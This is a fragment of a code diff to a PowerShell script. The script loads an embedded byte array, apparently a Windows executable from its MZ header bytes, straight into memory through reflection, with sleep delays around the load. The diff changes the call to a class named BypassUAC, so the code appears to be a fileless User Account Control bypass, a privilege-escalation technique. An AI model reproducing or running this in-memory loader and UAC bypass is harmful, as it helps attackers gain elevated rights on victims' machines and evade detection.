@@ -64,7 +64,7 @@ $decryptedbytes =[byte[]](77,90,144,0,3,0,0,0,4,0,0,0,255,255,0,0,184,0,0,0,0,0,
 sleep 5
 $assembly = [System.Reflection.Assembly]::Load($DecryptedBytes)
 sleep 5
-[BypassUAC.Program]::Main()
+[BypassUAC.Program]::Main(0)
 
 
 }
